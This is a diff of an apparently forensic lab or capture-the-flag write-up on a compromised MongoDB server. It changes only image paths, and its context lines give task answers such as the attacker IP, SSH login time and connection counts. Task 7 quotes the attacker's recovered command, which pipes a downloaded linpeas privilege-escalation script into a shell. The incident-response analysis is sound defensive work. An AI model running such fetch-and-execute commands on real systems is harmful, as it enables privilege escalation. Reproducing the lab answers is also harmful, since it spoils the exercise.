@@ -50,7 +50,7 @@ Based on a forensic analysis of the logs and artifacts provided in your screensh
 
 ![2026-05-18\_221250.png](/ob/Source%20Material/2026-05-18_221250.png)
 
-![Pasted image 20260521154935.png](/ob/Source%20Material/Pasted%20image%2020260521154935.png)
+![Pasted image 20260521154935.png](ob/Source%20Material/Pasted%20image%2020260521154935.png)
 
 ### **Task 2**
 
@@ -59,7 +59,7 @@ Based on a forensic analysis of the logs and artifacts provided in your screensh
 * **Answer:** `8.0.16`
 * **Evidence:** Running a `grep` for the `buildInfo` command in `mongod.log` reveals the JSON control structure metadata, showing a running parameter string of `"version":"8.0.16"`.
 
-![Pasted image 20260521155211.png](/ob/Source%20Material/Pasted%20image%2020260521155211.png)
+![Pasted image 20260521155211.png](ob/Source%20Material/Pasted%20image%2020260521155211.png)
 
 ### **Task 3**
 
@@ -68,7 +68,7 @@ Based on a forensic analysis of the logs and artifacts provided in your screensh
 * **Answer:** `65.0.76.43`
 * **Evidence:** The automated scan results from `mongobleed-detector.sh` flag this specific address as a `HIGH` risk anomaly. This aligns with the line filtering counts verifying a heavy transaction volume from this source within the database records.
 
-![2026-05-18\_224619.png](/ob/Source%20Material/2026-05-18_224619.png)
+![2026-05-18\_224619.png](ob/Source%20Material/2026-05-18_224619.png)
 
 ### **Task 4**
 
@@ -84,7 +84,7 @@ Based on a forensic analysis of the logs and artifacts provided in your screensh
 * **Answer:** `37630`
 * **Evidence:** The script metric profile shows a distinct tracking breakdown for the malicious host, identifying a total connections count (`ConnCount`) and disconnect profile (`DiscCount`) matching this exact value.
 
-![Pasted image 20260521155343.png](/ob/Source%20Material/Pasted%20image%2020260521155343.png)
+![Pasted image 20260521155343.png](ob/Source%20Material/Pasted%20image%2020260521155343.png)
 
 ### **Task 6**
 
@@ -93,9 +93,9 @@ Based on a forensic analysis of the logs and artifacts provided in your screensh
 * **Answer:** `2025-12-29T05:39:24.276756+00:00`
 * **Evidence:** System authorization sequence captures (`auth.log`) detail multiple failures before tracking a successful SSH connection matching process identifier pid `39825`, explicitly noting: `Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2`.
 
-![Pasted image 20260521155521.png](/ob/Source%20Material/Pasted%20image%2020260521155521.png)
+![Pasted image 20260521155521.png](ob/Source%20Material/Pasted%20image%2020260521155521.png)
 
-![Pasted image 20260521155541.png](/ob/Source%20Material/Pasted%20image%2020260521155541.png)
+![Pasted image 20260521155541.png](ob/Source%20Material/Pasted%20image%2020260521155541.png)
 
 ### **Task 7**
 
@@ -104,7 +104,7 @@ Based on a forensic analysis of the logs and artifacts provided in your screensh
 * **Answer:** `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh`
 * **Evidence:** Recovered shell artifacts from the user's local terminal history profile (`.bash_history`) record the explicit piping sequence fetching and executing the privilege escalation helper script from the public remote repository.
 
-![Pasted image 20260521155556.png](/ob/Source%20Material/Pasted%20image%2020260521155556.png)
+![Pasted image 20260521155556.png](ob/Source%20Material/Pasted%20image%2020260521155556.png)
 
 ### **Task 8**
 
